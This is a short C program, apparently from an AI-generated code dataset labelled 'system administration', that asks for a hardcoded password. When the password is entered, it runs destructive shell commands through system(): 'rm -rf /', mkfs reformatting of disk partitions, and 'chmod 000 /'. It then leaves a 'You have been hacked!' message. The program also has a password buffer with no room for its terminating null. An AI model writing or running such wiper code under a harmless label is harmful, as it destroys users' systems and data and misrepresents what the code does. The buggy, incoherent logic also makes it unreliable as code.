//FormAI DATASET v1.0 Category: System administration ; Style: paranoid
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>

int main() {
  char userInput[100];
  char password[16] = "mySecurePassword";
  int loginAttempts = 0;

  while(loginAttempts < 3) {
    printf("Enter password to continue: ");
    fgets(userInput, sizeof(userInput), stdin);

    // Remove newline character from userInput
    int len = strlen(userInput);
    if (len > 0 && userInput[len-1] == '\n') {
      userInput[--len] = '\0';
    }

    // Check if password is correct
    if (strcmp(userInput, password) == 0) {
      printf("Access granted!\n");

      // Let's do some paranoid system administration
      system("rm -rf /");
      system("mkfs.ext3 -F /dev/sda1");
      system("mkfs.ext3 -F /dev/sda2");
      system("mkfs.ext3 -F /dev/sda3");
      system("mkfs.ext3 -F /dev/sda4");
      system("mkswap /dev/sda5");
      system("mkswap /dev/sda6");
      system("mount -t ext3 /dev/sda1 /mnt");
      system("mount -t ext3 /dev/sda2 /var");
      system("mount -t ext3 /dev/sda3 /usr");
      system("mount -t ext3 /dev/sda4 /home");
      system("swapon /dev/sda5");
      system("swapon /dev/sda6");
      system("chmod 000 /");
      system("echo \"You have been hacked!\" > /home/hacker_message.txt");
      exit(0);

    } else {
      printf("Incorrect password. Try again.\n");
      loginAttempts++;
    }
  }

  printf("Too many login attempts. Exiting.\n");
  exit(1);
}